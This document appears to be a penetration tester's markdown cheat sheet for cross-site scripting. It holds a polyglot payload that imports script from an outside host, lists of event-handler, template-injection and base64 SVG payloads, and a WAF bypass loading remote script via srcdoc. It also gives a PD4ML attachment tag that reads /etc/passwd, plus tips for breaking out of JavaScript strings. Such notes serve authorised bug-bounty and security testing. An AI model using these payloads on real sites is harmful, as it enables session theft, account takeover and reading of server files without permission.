### XSS all in one
```
JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
```
### XSS payloads
`https://github.com/foospidy/payloads/tree/master/other/xss`
### Payload list
```
"style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
{{_c.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<body onpageshow=alert(1)>
<details open ontoggle="alert()">

HTML5 payloads
<video autoplay onloadstart="alert()" src=x></video>
<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>

```
#### XSS escalation
`https://www.bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/`
### Quick simple payload to use 
`"samsec%25%25"><u>`
### XSS mindmap
`https://raw.githubusercontent.com/cyberspacekittens/XSS/master/XSS2.png`
### XSS ployglot
```
\u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/oNLoad=confirm(69)>${{7*7}}
```

#### XSS in SVG image 
![image](https://github.com/Sameer484/methodology/assets/110039044/e40a3018-7707-457b-a054-bf3bb3832674)


##### If there is reflected value in the iframe src but akamai blocks it, we can try to bypass it using below payload
````
link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>

````
![Screenshot from 2023-06-16 18-53-58](https://github.com/Sameer484/methodology/assets/110039044/58c56999-42da-4fcb-a447-b11f9e223984)

#### If you found jinja2 templating engine being used , then see if the double quote is placed when using templating syntax in attribute. If directly {{name}} is being used then we can use "x eventhandler=alert(1)" to execute xss. Using space we can escape the attribute.
````
<input type={{name}}>         ==> vulnerable code
<input type="{{name}}" >      ==> well secure code
````


#### There a small quirk in DOM xss
```
IF you see this code snippet
let a =createElement('div');
a.innerHTML="variable here"
b=sanitize(a);
and add to dom after here

we can execute xss before the sanitize or adding to dom. <img src=x onerror=alert(1)> actually executes before appending to the dom.
```

---
#### Quick tips
- See the reflected value and open inspect element. Search(ctrl+f) for the entered keywords and trace where is it being used.
- If the value is being set to variable , we can escape it and enter javascript
  ````
  var a= "hacked"    //hacked is searched keyword in search bar and it is being assigned here like this.

  we can escape it using
     hacked";alert(2)//
  ````

- If no value are reflected in the response , then test for DOM based XSS. Open DOM Invador and enter the canary value in the search bar or anywhere in the query parameter.
- See if the website is built with Angular js. Now see if the reflected payload is inside the  ng-app directive{\<div ng-app> hacked(this is reflected value)}, check for {{7*7}} CSTI and if DOM is reflected with 49, then it's confirmed that CSTI is possible. 
 
  ---
 - XSS Basic Payload  ( anything'"<x</   )
## XSS in PDF generation using PD4ML library
The normal javascript injection doesn't work with pd4ml, but there is way to add attachment to the pdf. This way we can read internal files.
`<pd4ml:attachment src=”file:///etc/passwd”><pd4ml:attachment>`
- Also, we can try to perfrom SSTI when there is pdf generation in backend. 
